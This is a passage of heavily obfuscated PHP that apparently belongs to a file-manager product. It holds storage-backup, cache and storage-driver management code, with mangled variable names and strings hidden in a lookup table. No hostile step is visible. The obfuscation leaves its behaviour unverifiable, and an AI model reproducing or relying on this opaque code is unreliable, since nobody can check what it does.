Model($_SERVER[Ñ¯©ç][841])->where($êÅ˜œµ)->sum($_SERVER[Ñ¯©ç][89]); $Êûéê‹Â = new TaskFileTransfer($_SERVER[Ñ¯©ç][861], $_SERVER[Ñ¯©ç][835], $©Ÿî“•¼, LNG($_SERVER[Ñ¯©ç][836]) . $_SERVER[Ñ¯©ç][837] . LNG($_SERVER[Ñ¯©ç][862])); $Êûéê‹Â->task[$_SERVER[Ñ¯©ç][816]] = $´ª˜…ã; $ÌÙşë±¾ = array($_SERVER[Ñ¯©ç][863] => $©Ÿî“•¼, $_SERVER[Ñ¯©ç][864] => $´ª˜…ã, $_SERVER[Ñ¯©ç][865] => time()); Backup::set($ÌÙşë±¾); $‡“ã«©Ñ = !0; $õ‚Ô©ìÊ = $this->storeIds(); $•á¡úÒ = 1; $Ù‹¶Õ¬§ = 1000; $¼ùê¶¬ = $÷—¢Ô“á = 0; $‹œö«ÛŸ = array(); $™ÃÁ¿ü› = $à´¸œÖ‹ = 0; do { $œØŒøÕ® = $_SERVER[Ñ¯©ç][866]; $£¥…’‚ù = Model($_SERVER[Ñ¯©ç][841])->where($êÅ˜œµ)->field($œØŒøÕ®)->order($_SERVER[Ñ¯©ç][867])->selectPage($Ù‹¶Õ¬§, $•á¡úÒ); $æÕ—¤ëÅ = !empty($£¥…’‚ù[$_SERVER[Ñ¯©ç][429]]) ? $£¥…’‚ù[$_SERVER[Ñ¯©ç][429]] : array(); foreach ($æÕ—¤ëÅ as $¿µµö³) { if (!$this->_fileExist($¿µµö³, $‹œö«ÛŸ, $õ‚Ô©ìÊ)) { write_log("\x66\151\x6c\145\40\156\157\x74\x20\145\170\151\163\164\x2e\146\x69\154\x65\111\x44\72{$¿µµö³[$_SERVER[Ñ¯©ç][524]]}\54\40\160\x61\x74\x68\x3a{$¿µµö³[$_SERVER[Ñ¯©ç][97]]}", $_SERVER[Ñ¯©ç][868]); continue; } $ºğòõš¥ = $¿µµö³[$_SERVER[Ñ¯©ç][97]]; $î®ô°ó = "\173\151\x6f\x3a{$´ Õ†Õß[$_SERVER[Ñ¯©ç][804]]}\x7d" . substr($ºğòõš¥, strlen("\x7b\151\x6f\x3a{$¿µµö³[$_SERVER[Ñ¯©ç][869]]}\175")); if (IO::exist($î®ô°ó)) { $Êûéê‹Â->updateFileEnd($¿µµö³[$_SERVER[Ñ¯©ç][32]], $¿µµö³[$_SERVER[Ñ¯©ç][89]]); } else { $î®ô°ó = get_path_father($î®ô°ó); IO::mkdir($î®ô°ó); if (!IO::copy($ºğòõš¥, $î®ô°ó, $_SERVER[Ñ¯©ç][870])) { write_log($_SERVER[Ñ¯©ç][871] . $ºğòõš¥ . $_SERVER[Ñ¯©ç][855] . $î®ô°ó . $_SERVER[Ñ¯©ç][178], $_SERVER[Ñ¯©ç][835]); $‡“ã«©Ñ = !1; break; } } $æ°°Õ©Ù = $¿µµö³[$_SERVER[Ñ¯©ç][524]]; $÷—¢Ô“á += 1; $¼ùê¶¬ += $¿µµö³[$_SERVER[Ñ¯©ç][89]]; $à´¸œÖ‹ += 1; $™ÃÁ¿ü› += $¿µµö³[$_SERVER[Ñ¯©ç][89]]; if ($¼ùê¶¬ >= 1024 * 1024 * 100) { $ÌÙşë±¾ = array($_SERVER[Ñ¯©ç][872] => $æ°°Õ©Ù, $_SERVER[Ñ¯©ç][873] => $à´¸œÖ‹, $_SERVER[Ñ¯©ç][874] => $™ÃÁ¿ü›); Backup::set($ÌÙşë±¾); $¼ùê¶¬ = $÷—¢Ô“á = 0; } } $˜ùõŒÖÌ = count($æÕ—¤ëÅ); $•á¡úÒ++; } while ($˜ùõŒÖÌ == $Ù‹¶Õ¬§); $Êûéê‹Â->end(); $ÌÙşë±¾ = array($_SERVER[Ñ¯©ç][875] => 1, $_SERVER[Ñ¯©ç][814] => time(), $_SERVER[Ñ¯©ç][828] => 1, $_SERVER[Ñ¯©ç][872] => $æ°°Õ©Ù, $_SERVER[Ñ¯©ç][876] => time()); if ($÷—¢Ô“á) { $ÌÙşë±¾[$_SERVER[Ñ¯©ç][873]] = $à´¸œÖ‹; $ÌÙşë±¾[$_SERVER[Ñ¯©ç][874]] = $™ÃÁ¿ü›; } Backup::set($ÌÙşë±¾); return !0; } private function _fileExist($‹É¥À¨·, &$Å±±á„, $±®éÛçø) { $ì°…Ùß‹ =& $_SERVER[Ñ¯©ç]; $–äŸÏ = $‹É¥À¨·[$ì°…Ùß‹[97]]; if (in_array($‹É¥À¨·[$ì°…Ùß‹[524]], $Å±±á„)) { return !1; } if (!in_array($‹É¥À¨·[$ì°…Ùß‹[869]], $±®éÛçø)) { return !1; } if (IO::exist($–äŸÏ)) { return !0; } $“ñİÛ½„ = get_path_father($–äŸÏ); if (IO::exist($“ñİÛ½„)) { $Å±±á„[] = $‹É¥À¨·[$ì°…Ùß‹[524]]; return !1; } $äã´°Ì = array($ì°…Ùß‹[869] => $‹É¥À¨·[$ì°…Ùß‹[869]], $ì°…Ùß‹[97] => array($ì°…Ùß‹[442], "{$“ñİÛ½„}\45")); $Ï³ùªä = Model($ì°…Ùß‹[841])->where($äã´°Ì)->field($ì°…Ùß‹[525])->select(); $Å±±á„ = array_merge($Å±±á„, array_to_keyvalue($Ï³ùªä, $ì°…Ùß‹[12], $ì°…Ùß‹[524])); return !1; } private function _fileFilter($±–²—û­) { $íÜòŞ¤è =& $_SERVER[Ñ¯©ç]; return; if (empty($±–²—û­)) { return; } $Ş™ÙŒ¦ç = array($íÜòŞ¤è[524] => array($íÜòŞ¤è[7], array_unique($±–²—û­))); $¿ÔšÍªÓ = Model($íÜòŞ¤è[877])->where($Ş™ÙŒ¦ç)->field($íÜòŞ¤è[194])->select(); foreach ($¿ÔšÍªÓ as $•å£¯Åü) { Model($íÜòŞ¤è[877])->remove($•å£¯Åü[$íÜòŞ¤è[194]], !1); } } private function storeIds() { $“£Îú·¦ =& $_SERVER[Ñ¯©ç]; $Ïò¼„üª = Model($“£Îú·¦[820])->listData(); $Ğ„ë ›å = array(); $ÆŒªúš” = $GLOBALS[$“£Îú·¦[6]][$“£Îú·¦[102]][$“£Îú·¦[878]]; foreach ($Ïò¼„üª as $Ï¯‘ÚØë) { $¶³‚»Ì· = strtolower($Ï¯‘ÚØë[$“£Îú·¦[108]]); if (!isset($ÆŒªúš”[$¶³‚»Ì·])) { continue; } $¸¥šÉ„î = $“£Îú·¦[87] . (isset($ÆŒªúš”[$¶³‚»Ì·]) ? $ÆŒªúš”[$¶³‚»Ì·] : ucfirst($¶³‚»Ì·)); if (!class_exists($¸¥šÉ„î)) { continue; } $Ğ„ë ›å[] = $Ï¯‘ÚØë[$“£Îú·¦[458]]; } return $Ğ„ë ›å; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $ş± ¢÷œ =& $_SERVER[Ñ¯©ç]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $¬¦ˆÚ = $GLOBALS[$ş± ¢÷œ[6]][$ş± ¢÷œ[409]]; $¿ê“ç”ó = $¬¦ˆÚ[$¬¦ˆÚ[$ş± ¢÷œ[879]]]; $³ÆÛÆª = $¬¦ˆÚ[$ş± ¢÷œ[880]]; switch ($¬¦ˆÚ[$ş± ¢÷œ[879]]) { case $ş± ¢÷œ[21]: self::$handle = Model($ş± ¢÷œ[881]); break; case $ş± ¢÷œ[882]: self::$handle = new CacheRedis($¿ê“ç”ó, $³ÆÛÆª); break; case $ş± ¢÷œ[883]: self::$handle = new CacheMemcached($¿ê“ç”ó, $³ÆÛÆª); break; case $ş± ¢÷œ[231]: self::$handle = new CacheFile($¿ê“ç”ó, $³ÆÛÆª); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ë³İú‰ ) { if (is_array($ë³İú‰ ) || is_object($ë³İú‰ )) { $ë³İú‰  = json_encode($ë³İú‰ ); } $ë³İú‰  = rawurlencode($ë³İú‰ ); return md5(KOD_SITE_ID . $_SERVER[Ñ¯©ç][11] . $ë³İú‰ ); } public static function get($ñšÓİÇ, $Ê¯«Šˆö = false) { $ß²–È© = self::key($ñšÓİÇ); $Ö×¾åÆ¸ = self::init(); if ($Ê¯«Šˆö) { return unserialize($Ö×¾åÆ¸->get($ß²–È©)); } if (!isset(self::$memoryCache[$ß²–È©])) { $Œèû÷ä¼ = $Ö×¾åÆ¸->get($ß²–È©); self::$memoryCache[$ß²–È©] = unserialize($Œèû÷ä¼); } return self::$memoryCache[$ß²–È©]; } public static function set($Ñ¥¡„­, $‚û¼Ëó÷, $‘ó­í»‘ = false) { $Û¯Ÿüµ‚ =& $_SERVER[Ñ¯©ç]; $…¨ß = self::key($Ñ¥¡„­); if (isset(self::$memoryCache[$…¨ß]) && self::$memoryCache[$…¨ß] === $‚û¼Ëó÷) { return !0; } if ($‘ó­í»‘ === 0) { self::$memoryCache[$…¨ß] = $‚û¼Ëó÷; return !0; } $¤à´õÇ™ = self::init(); $Ø©¼Üöş = serialize($‚û¼Ëó÷); CacheLock::lock($Ñ¥¡„­ . $Û¯Ÿüµ‚[884]); $°“—‡¼Ú = $¤à´õÇ™->set($…¨ß, $Ø©¼Üöş, $‘ó­í»‘); self::$memoryCache[$…¨ß] = $‚û¼Ëó÷; CacheLock::unlock($Ñ¥¡„­ . $Û¯Ÿüµ‚[884]); return $°“—‡¼Ú; } public static function getCall($ğîÚù‹´, $¶æºÉ˜, $ÓÕ¢à†ß, $Å«ÊÀ·Å = array()) { $™Â±å¤¢ =& $_SERVER[Ñ¯©ç]; $ò÷¿ËØ = self::get($ğîÚù‹´); if ($ò÷¿ËØ || $ò÷¿ËØ === $™Â±å¤¢[12]) { return $ò÷¿ËØ; } $ò÷¿ËØ = call_user_func_array($ÓÕ¢à†ß, $Å«ÊÀ·Å); $ò÷¿ËØ = $ò÷¿ËØ ? $ò÷¿ËØ : $™Â±å¤¢[12]; self::set($ğîÚù‹´, $ò÷¿ËØ, $¶æºÉ˜); return $ò÷¿ËØ; } public static function remove($í¾ş¸ó) { $–Ù´µ—ò = self::key($í¾ş¸ó); unset(self::$memoryCache[$–Ù´µ—ò]); self::clearTimeout(); CacheLock::lock($í¾ş¸ó); $è¯Ó…Ïô = self::init()->remove($–Ù´µ—ò); CacheLock::unlock($í¾ş¸ó); return $è¯Ó…Ïô; } public static function removeMemory($¤§ıÆ‘ó) { $Ñ…ãÑºç = self::key($¤§ıÆ‘ó); unset(self::$memoryCache[$Ñ…ãÑºç]); } public static function clearMemory($§‚åÄ§Ù = false) { if ($§‚åÄ§Ù) { $§‚åÄ§Ù = self::key($§‚åÄ§Ù); unset(self::$memoryCache[$§‚åÄ§Ù]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Ñ¯©ç][885])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Ñ¯©ç][886])) { self::init()->clearTimeout(); } } } goto aƒŸ†Ç„õ; Bã¡ÄÈ¬À: class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\155\56\x73\x74\157\162\141\147\145\x4c\x69\x73\164"; public $field = array("\x6e\141\155\145", "\x73\x69\x7a\x65\115\x61\x78", "\x73\x79\163\164\145\155", "\144\145\x66\x61\165\154\164", "\x64\x72\151\166\145\162", "\x63\x6f\x6e\146\151\147"); public function listData($…¨¤“ƒ = false, $¥ãÂÑËŒ = "\155\157\x64\x69\146\x79\124\151\x6d\x65", $•¸Óñ– = false) { $¯ï§âƒ“ =& $_SERVER[Ñ¯©ç]; $ƒôößÚÃ = parent::listData($…¨¤“ƒ, $¥ãÂÑËŒ, $•¸Óñ–); if ($…¨¤“ƒ) { return $ƒôößÚÃ; } $¯‰×ÈŠ÷ = array(); if ($GLOBALS[$¯ï§âƒ“[2278]]) { $¯‰×ÈŠ÷ = $this->ioSizeUseGet(array_to_keyvalue($ƒôößÚÃ, $¯ï§âƒ“[12], $¯ï§âƒ“[458])); } foreach ($ƒôößÚÃ as $Òô’ï—Ø => $Œ‰ã¢ğ) { unset($ƒôößÚÃ[$Òô’ï—Ø][$¯ï§âƒ“[6]]); $ƒôößÚÃ[$Òô’ï—Ø][$¯ï§âƒ“[1944]] = isset($¯‰×ÈŠ÷[$Œ‰ã¢ğ[$¯ï§âƒ“[458]]]) ? $¯‰×ÈŠ÷[$Œ‰ã¢ğ[$¯ï§âƒ“[458]]] : 0; } return $ƒôößÚÃ; } public function ioSizeUseGet($«ãõ–) { $ù·¿¶ŒÆ =& $_SERVER[Ñ¯©ç]; if (!$«ãõ–) { return array(); } $ÃÍ¥ßÜù = $ù·¿¶ŒÆ[2279] . implode($ù·¿¶ŒÆ[50], $«ãõ–); $¤šçë  = Cache::get($ÃÍ¥ßÜù); if ($¤šçë ) { return $¤šçë ; } $ü‰ß€¡Ü = array($ù·¿¶ŒÆ[869] => $ù·¿¶ŒÆ[458], $ù·¿¶ŒÆ[2280] => $ù·¿¶ŒÆ[89]); $×Îï÷Õ = array($ù·¿¶ŒÆ[869] => array($ù·¿¶ŒÆ[7], $«ãõ–)); $¤šçë  = Model($ù·¿¶ŒÆ[841])->field($ü‰ß€¡Ü)->where($×Îï÷Õ)->group($ù·¿¶ŒÆ[869])->select(); $¤šçë  = array_to_keyvalue($¤šçë , $ù·¿¶ŒÆ[458], $ù·¿¶ŒÆ[89]); Cache::set($ÃÍ¥ßÜù, $¤šçë , 600); return $¤šçë ; } public function getConfig($°ñÉëûË) { $ æ¿Á«³ = parent::listData($°ñÉëûË); return json_decode($ æ¿Á«³[$_SERVER[Ñ¯©ç][6]], !0); } public function update($ãŠŠæşĞ, $ù°›´í) { $–‚‘Ù¼ï =& $_SERVER[Ñ¯©ç]; $Ó«—‹Ç® = $ù°›´í[$–‚‘Ù¼ï[32]]; $Öûíèµù = array_to_keyvalue(parent::listData(), $–‚‘Ù¼ï[32]); if (isset($Öûíèµù[$Ó«—‹Ç®]) && $Öûíèµù[$Ó«—‹Ç®][$–‚‘Ù¼ï[458]] != $ãŠŠæşĞ) { return !1; } $this->checkPwd($ãŠŠæşĞ, $ù°›´í); if (isset($ù°›´í[$–‚‘Ù¼ï[2281]]) && $ù°›´í[$–‚‘Ù¼ï[2281]] == $–‚‘Ù¼ï[101]) { $this->checkConfig($ù°›´í); } unset($ù°›´í[$–‚‘Ù¼ï[2281]]); $á² ¤—¸ = parent::update($ãŠŠæşĞ, $ù°›´í); if ($á² ¤—¸ && $ù°›´í[$–‚‘Ù¼ï[37]]) { $ë§ƒˆğ¿ = 0; foreach ($Öûíèµù as $ã½†‰×‡) { if ($ã½†‰×‡[$–‚‘Ù¼ï[37]] && $ã½†‰×‡[$–‚‘Ù¼ï[458]] != $ãŠŠæşĞ) { $ë§ƒˆğ¿ = $ã½†‰×‡[$–‚‘Ù¼ï[458]]; parent::update($ã½†‰×‡[$–‚‘Ù¼ï[458]], array($–‚‘Ù¼ï[37] => 0)); } } $this->updateBackup($ãŠŠæşĞ, $ë§ƒˆğ¿); } return $á² ¤—¸; } public function add($Ççû’¿Æ) { $Ê­¬·¢¯ =& $_SERVER[Ñ¯©ç]; $Ï›«¬ÖÇ = array_to_keyvalue(parent::listData(), $Ê­¬·¢¯[32]); if (isset($Ï›«¬ÖÇ[$Ççû’¿Æ[$Ê­¬·¢¯[32]]])) { return !1; } $this->checkConfig($Ççû’¿Æ); $ñôô¨–ä = parent::insert($Ççû’¿Æ); if ($ñôô¨–ä && $Ççû’¿Æ[$Ê­¬·¢¯[37]]) { foreach ($Ï›«¬ÖÇ as $—ÓÒ¹Ó) { if ($—ÓÒ¹Ó[$Ê­¬·¢¯[37]]) { parent::update($—ÓÒ¹Ó[$Ê­¬·¢¯[458]], array($Ê­¬·¢¯[37] => 0)); } } } return $ñôô¨–ä; } public function updateBackup($ØĞˆ«ğá, $»ÌÀ ß) { $–È‹½³¥ =& $_SERVER[Ñ¯©ç]; if (!$»ÌÀ ß) { return; } $¼»œğãÚ = Model($–È‹½³¥[802])->config(); if ($¼»œğãÚ[$–È‹½³¥[1727]] != $–È‹½³¥[101] || $¼»œğãÚ[$–È‹½³¥[804]] != $»ÌÀ ß) { return; } $×Øí¥ÔÈ = Model($–È‹½³¥[823])->get($–È‹½³¥[835]); $×Øí¥ÔÈ = json_decode($×Øí¥ÔÈ, !0); if (!$×Øí¥ÔÈ) { return; } $×Øí¥ÔÈ[$–È‹½³¥[804]] = $ØĞˆ«ğá; Model($–È‹½³¥[823])->set(array($–È‹½³¥[835] => $×Øí¥ÔÈ)); } public function checkPwd($§ôÉî, &$À¢—¿§) { $ĞŸí·ğà =& $_SERVER[Ñ¯©ç]; if (empty($À¢—¿§[$ĞŸí·ğà[6]])) { return; } $šøê¹æš = json_decode($À¢—¿§[$ĞŸí·ğà[6]], !0); $ÚÍÆå÷“ = $ĞŸí·ğà[12]; $ÅïÊÙñ = array($ĞŸí·ğà[2282], $ĞŸí·ğà[2283], $ĞŸí·ğà[942]); foreach ($ÅïÊÙñ as $·äİ¹¤—) { if (isset($šøê¹æš[$·äİ¹¤—])) { $ÚÍÆå÷“ = $·äİ¹¤—; break; } } if (!$ÚÍÆå÷“) { return; } $š¬›ô¢Ÿ = $this->getConfig($§ôÉî); $Ø‘›Ñ‰ = $š¬›ô¢Ÿ[$ÚÍÆå÷“]; $ÙÓ‘è½ã = $šøê¹æš[$ÚÍÆå÷“]; if ($ÙÓ‘è½ã == str_repeat($ĞŸí·ğà[221], strlen($Ø‘›Ñ‰))) { $šøê¹æš[$ÚÍÆå÷“] = $Ø‘›Ñ‰; $À¢—¿§[$ĞŸí·ğà[6]] = json_encode($šøê¹æš); } else { if ($ÙÓ‘è½ã != $Ø‘›Ñ‰) { $À¢—¿§[$ĞŸí·ğà[2281]] = $ĞŸí·ğà[101]; } } } public function checkConfig(&$÷ü¾«ÂË, $º¼Ëò—’ = false) { $ªöøÍ¢ =& $_SERVER[Ñ¯©ç]; $Ø”şçâİ = strtolower($÷ü¾«ÂË[$ªöøÍ¢[108]]); $¥Â£ Ãó = json_decode($÷ü¾«ÂË[$ªöøÍ¢[6]], !0); foreach ($¥Â£ Ãó as $ÔíÂéŠ’ => $¬ÅàÕûŞ) { if (is_string($¬ÅàÕûŞ)) { $¥Â£ Ãó[$ÔíÂéŠ’] = trim($¬ÅàÕûŞ); } } $¥Â£ Ãó[$ªöøÍ¢[2284]] = rand_string(6); $ÉıØïŞ¨ = $GLOBALS[$ªöøÍ¢[6]][$ªöøÍ¢[102]][$ªöøÍ¢[878]]; $úòÈâÖ = isset($ÉıØïŞ¨[$Ø”şçâİ]) ? $ÉıØïŞ¨[$Ø”şçâİ] : ucfirst($Ø”şçâİ); $ÅƒïÀëå = $ªöøÍ¢[87] . $úòÈâÖ; if (!$úòÈâÖ || !class_exists($ÅƒïÀëå)) { if ($º¼Ëò—’) { return LNG($ªöøÍ¢[2285]); } write_log(array($ªöøÍ¢[2286], $÷ü¾«ÂË, get_caller_info()), $ªöøÍ¢[216]); show_json(LNG($ªöøÍ¢[2285]), !1, $÷ü¾«ÂË); } $‚€¨Œ° = new $ÅƒïÀëå($¥Â£ Ãó); if (in_array($Ø”şçâİ, $‚€¨Œ°->objectDriver)) { try { if (!$‚€¨Œ°->isBucketCors() && !$‚€¨Œ°->setBucketCors()) { $µ„±Š¯› = LNG($ªöøÍ¢[2287]); $µ„±Š¯› .= $ªöøÍ¢[2288] . LNG($ªöøÍ¢[2289]); } } catch (Exception $ó³»¢ó…) { $µ„±Š¯› = $ó³»¢ó…->getMessage(); } if (isset($µ„±Š¯›)) { return $this->_parseError($µ„±Š¯›, $Ø”şçâİ, $º¼Ëò—’); } } $ïá›şÜ¹ = rtrim($¥Â£ Ãó[$ªöøÍ¢[1237]], $ªöøÍ¢[8]) . $ªöøÍ¢[8]; $ÓÈ¬£¸Î = $‚€¨Œ°->getPath($ïá›şÜ¹ . $ªöøÍ¢[1241]); try { $»êºáé = $‚€¨Œ°->mkfile($ÓÈ¬£¸Î); if (!$»êºáé) { $µ„±Š¯› = LNG($ªöøÍ¢[2287]); } } catch (Exception $ó³»¢ó…) { $µ„±Š¯› = $ó³»¢ó…->getMessage(); } if (isset($µ„±Š¯›)) { return $this->_parseError($µ„±Š¯›, $Ø”şçâİ, $º¼Ëò—’); } if ($Ø”şçâİ == $ªöøÍ¢[78] && !$‚€¨Œ°->checkRegion()) { return $this->_parseError(LNG($ªöøÍ¢[2290]), $Ø”şçâİ, $º¼Ëò—’); } $¥Â£ Ãó[$ªöøÍ¢[1237]] = $ïá›şÜ¹; $÷ü¾«ÂË[$ªöøÍ¢[6]] = json_encode($¥Â£ Ãó); $÷ü¾«ÂË[$ªöøÍ¢[108]] = $úòÈâÖ; return !0; } private function _parseError($ë›×ş®», $Î½’‘¦Û, $ùº±‹ = false) { $Å×¿ =& $_SERVER[Ñ¯©ç]; if ($Î½’‘¦Û == $Å×¿[78] && stripos($ë›×ş®», $Å×¿[2291])) { $„öØ…‰ = explode($Å×¿[10], $ë›×ş®»); $éìÆËÒ = isset($„öØ…‰[1]) ? $„öØ…‰[1] : $Å×¿[12]; $çÜÓ¿Ø‹ = array($Å×¿[2292] => LNG($Å×¿[2293]), $Å×¿[2294] => LNG($Å×¿[2295])); if (isset($çÜÓ¿Ø‹[$éìÆËÒ])) { $ë›×ş®» = $çÜÓ¿Ø‹[$éìÆËÒ]; } } if (stripos($ë›×ş®», $Å×¿[2296]) === 0) { $Æ†””Ï = strpos($ë›×ş®», $Å×¿[178]); if ($Æ†””Ï === !1) { $Æ†””Ï = strpos($ë›×ş®», $Å×¿[4]); } if ($Æ†””Ï !== !1) { $ë›×ş®» = substr($ë›×ş®», $Æ†””Ï + 1); } } $ë›×ş®» = LNG($Å×¿[1243]) . $ë›×ş®»; if ($ùº±‹) { return $ë›×ş®»; } show_json($ë›×ş®», !1); } public function driverListSystem() { $È°ş©Ïµ =& $_SERVER[Ñ¯©ç]; $î•ÉŠûË = parent::listData(); $Ì††ø‹¼ = array(); foreach ($î•ÉŠûË as $µØ–²·Ñ) { unset($µØ–²·Ñ[$È°ş©Ïµ[232]], $µØ–²·Ñ[$È°ş©Ïµ[98]]); $µØ–²·Ñ[$È°ş©Ïµ[6]] = json_decode($µØ–²·Ñ[$È°ş©Ïµ[6]], !0); $Ì††ø‹¼[] = $µØ–²·Ñ; } return $Ì††ø‹¼; } public function defaultDriver() { $Šñ‹£¾‘ =& $_SERVER[Ñ¯©ç]; $„ºÆÉ­ë = parent::listData(); $‰´Ì×íì = array_filter_by_field($„ºÆÉ­ë, $Šñ‹£¾‘[37], 1); $‰´Ì×íì = $‰´Ì×íì[0]; if ($‰´Ì×íì) { $‰´Ì×íì[$Šñ‹£¾‘[6]] = json_decode($‰´Ì×íì[$Šñ‹£¾‘[6]], !0); } return $‰´Ì×íì; } public function driverInfo($ıûÈ«æ) { $¸Àª£©´ =& $_SERVER[Ñ¯©ç]; $¨Ö½ëÕ§ = array_to_keyvalue(parent::listData(), $¸Àª£©´[458]); if (!isset($¨Ö½ëÕ§[$ıûÈ«æ])) { return !1; } $ü‚„ˆØ· = $¨Ö½ëÕ§[$ıûÈ«æ]; $ü‚„ˆØ·[$¸Àª£©´[6]] = json_decode($ü‚„ˆØ·[$¸Àª£©´[6]], !0); return $ü‚„ˆØ·; } public function remove($¦¿‹–²†) { $this->removeShareItems($¦¿‹–²†); return parent::remove($¦¿‹–²†); } public function removeWithFile($Ü¹š¤À, $Ğ¶¬ ‚å, $Š›Ù”ì², $ŸÚö¤ê = false) { $ åŸ™ğÀ =& $_SERVER[Ñ¯©ç]; $íšá“¼’ = array($ åŸ™ğÀ[869] => $Ü¹š¤À); $ˆç»ˆË = Model($ åŸ™ğÀ[527])->where($íšá“¼’)->count(); $ïÎäÉù = Model($ åŸ™ğÀ[527])->where($íšá“¼’)->sum($ åŸ™ğÀ[89]); $ÔÔÇğù÷ = $Ğ¶¬ ‚å . $ åŸ™ğÀ[2297] . $Ü¹š¤À; $çˆŸÊı = LNG($Ğ¶¬ ‚å == $ åŸ™ğÀ[603] ? $ åŸ™ğÀ[2298] : $ åŸ™ğÀ[2299]); $¶Ü™”ı = new TaskFileTransfer($ÔÔÇğù÷, $ åŸ™ğÀ[216], $ˆç»ˆË, $çˆŸÊı . $ åŸ™ğÀ[445] . $Š›Ù”ì²[$ åŸ™ğÀ[32]] . $ åŸ™ğÀ[215] . $Ü¹š¤À); $¶Ü™”ı->task[$ åŸ™ğÀ[816]] = (double) $ïÎäÉù; $‹øÑ¥ ± = KodIO::defaultDriver(); $è·Ã‹ü… = $‹øÑ¥ ±[$ åŸ™ğÀ[458]]; $ÀÙÃëµ = $ûıÛóò´ = $ë¼ñ´ÈÀ = array(); $‡´ş¸Ãº = Model($ åŸ™ğÀ[231])->where($íšá“¼’)->field($ åŸ™ğÀ[2300])->select(); foreach ($‡´ş¸Ãº as $÷•É·áı) { $¡€‹–‚Ğ = $÷•É·áı[$ åŸ™ğÀ[524]]; if ($ŸÚö¤ê) { $ûıÛóò´[] = $¡€‹–‚Ğ; continue; } $áóŠ ò = $÷•É·áı[$ åŸ™ğÀ[97]]; $ÇÍŞİİ˜ = get_path_father($áóŠ ò); $ë¼ñ´ÈÀ[] = $ÇÍŞİİ˜; $ÇÍŞİİ˜ = str_replace("\173\x69\x6f\72{$Ü¹š¤À}\x7d\x2f", "\x7b\x69\x6f\72{$è·Ã‹ü…}\175\57", $ÇÍŞİİ˜); if (!IO::exist($áóŠ ò)) { $ÀÙÃëµ[] = $¡€‹–‚Ğ; $¶Ü™”ı->updateFileEnd($÷•É·áı[$ åŸ™ğÀ[32]], $÷•É·áı[$ åŸ™ğÀ[89]]); write_log($ åŸ™ğÀ[2301] . $áóŠ ò, $ åŸ™ğÀ[1887]); continue; } $ø¡Ä±Õ = IO::move($áóŠ ò, $ÇÍŞİİ˜, REPEAT_RENAME); if (!$ø¡Ä±Õ) { $ûıÛóò´[] = $¡€‹–‚Ğ; $¶Ü™”ı->updateFileEnd($÷•É·áı[$ åŸ™ğÀ[32]], $÷•É·áı[$ åŸ™ğÀ[89]]); write_log($ åŸ™ğÀ[2302] . $áóŠ ò, $ åŸ™ğÀ[1887]); continue; } $íšá“¼’ = array($ åŸ™ğÀ[524] => $¡€‹–‚Ğ); $ÏÚİşé³ = array($ åŸ™ğÀ[869] => $è·Ã‹ü…, $ åŸ™ğÀ[97] => $ø¡Ä±Õ); Model($ åŸ™ğÀ[231])->where($íšá“¼’)->save($ÏÚİşé³); } $ÊŒµùÎÒ = $¶Ü™”ı->task; if (!$ŸÚö¤ê) { Cache::set($ÔÔÇğù÷, $ÊŒµùÎÒ); } $¶Ü™”ı->end(); $ÀÙÃëµ = array_unique($ÀÙÃëµ); $ûıÛóò´ = array_unique($ûıÛóò´); if (!$ŸÚö¤ê && ($ÀÙÃëµ || $ûıÛóò´)) { $ï”„¦¹ = array(); if ($ÀÙÃëµ) { $ï”„¦¹[] = sprintf(LNG($ åŸ™ğÀ[2303]), count($ÀÙÃëµ)); } if ($ûıÛóò´) { $ï”„¦¹[] = sprintf(LNG($ åŸ™ğÀ[2304]), count($ûıÛóò´)); } $ï”„¦¹ = sprintf(LNG($ åŸ™ğÀ[2305]), implode($ åŸ™ğÀ[2306], $ï”„¦¹)) . $ åŸ™ğÀ[2307] . date($ åŸ™ğÀ[2308]) . $ åŸ™ğÀ[2309]; if ($Ğ¶¬ ‚å == $ åŸ™ğÀ[1924]) { $ï”„¦¹ .= $ åŸ™ğÀ[2310] . LNG($ åŸ™ğÀ[2311]); } $ÊŒµùÎÒ[$ åŸ™ğÀ[1239]] = $ï”„¦¹; Cache::set($ÔÔÇğù÷, $ÊŒµùÎÒ); unset($Š›Ù”ì²[$ åŸ™ğÀ[6]]); $öˆ–Ö½ = array($ åŸ™ğÀ[458] => $Ü¹š¤À, $ åŸ™ğÀ[2190] => $ åŸ™ğÀ[603], $ åŸ™ğÀ[32] => $Š›Ù”ì²[$ åŸ™ğÀ[32]], $ åŸ™ğÀ[1259] => $Š›Ù”ì²); Hook::trigger($ åŸ™ğÀ[1768], array($ åŸ™ğÀ[1259] => $öˆ–Ö½, $ åŸ™ğÀ[1269] => !0)); show_json($ï”„¦¹, !1, 100111); } if ($Ğ¶¬ ‚å == $ åŸ™ğÀ[603]) { return !0; } if ($ÀÙÃëµ || $ûıÛóò´) { $Å„Îµ“û = array_merge($ÀÙÃëµ, $ûıÛóò´); $Å„Îµ“û = array_filter(array_unique($Å„Îµ“û)); $this->removeByFileID($Å„Îµ“û); } if ($ë¼ñ´ÈÀ) { $ë¼ñ´ÈÀ = array_filter(array_unique($ë¼ñ´ÈÀ)); foreach ($ë¼ñ´ÈÀ as $áóŠ ò) { $†ÊÆí§¬ = IO::has($áóŠ ò, !0); if (!$†ÊÆí§¬[$ åŸ™ğÀ[240]] && !$†ÊÆí§¬[$ åŸ™ğÀ[241]]) { IO::remove($áóŠ ò); } } } return $this->remove($Ü¹š¤À); } private function removeByFileID($ÂğÉäÈ± = array()) { $èÒÒÒˆü =& $_SERVER[Ñ¯©ç]; if (empty($ÂğÉäÈ±)) { return; } $ß»°›ÎÛ = array($èÒÒÒˆü[524] => array($èÒÒÒˆü[7], $ÂğÉäÈ±)); $îºÏ‘öô = Model($èÒÒÒˆü[1391])->where($ß»°›ÎÛ)->field($èÒÒÒˆü[194])->select(); if (!$îºÏ‘öô) { return Model($èÒÒÒˆü[527])->remove($ÂğÉäÈ±); } $îºÏ‘öô = array_to_keyvalue($îºÏ‘öô, $èÒÒÒˆü[12], $èÒÒÒˆü[194]); foreach ($îºÏ‘öô as $©şÑ‘Ì) { 